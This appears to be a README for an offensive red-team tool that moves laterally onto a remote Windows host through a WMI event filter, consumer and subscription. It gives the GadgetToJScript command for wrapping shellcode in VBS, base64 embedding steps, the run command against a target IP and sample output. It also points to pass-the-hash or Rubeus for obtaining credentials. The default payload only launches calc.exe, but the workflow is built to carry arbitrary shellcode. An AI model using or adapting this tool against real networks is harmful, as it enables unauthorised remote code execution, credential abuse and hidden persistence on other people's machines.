# WMI Event Filter Lateral Movement


## Usage

Build the latest version of GadgetToJScript, x86 architecture targeting .NET version 4.x.
Use the following command to generate the VBS/JS:

```
.\GadgetToJScript.exe -w vbs -b -c inject.cs -d System.dll,System.Management.dll
```

Remember to add the x64 shellcode inside `inject.cs`.
Take the resulting `test.vbs` file and convert it to base64:

```
cat test.vbs | base64 | pbcopy
```

Remember to use UTF8 encoding.
Put the resulting base64 inside `Program.cs`, the current VBS will spawn `calc.exe`.
Build the project and execute it as follows:

```
wmi-lateral-movement.exe TARGET
```

The program will use the current user token to establish the connection, so use `make_toke`, PtH or `Rubeus` to do that.

```
wmi-event-lateral-movement.exe 172.16.119.140
[*] Event filter created.
[*] Event consumer created.
[*] Subscription created, now sleeping
[*] Sending some DCOM love..
[*] Sleeping again... long day

```

The trigger for the event is an additional logon event generated after a connection that uses DCOM over RPC.
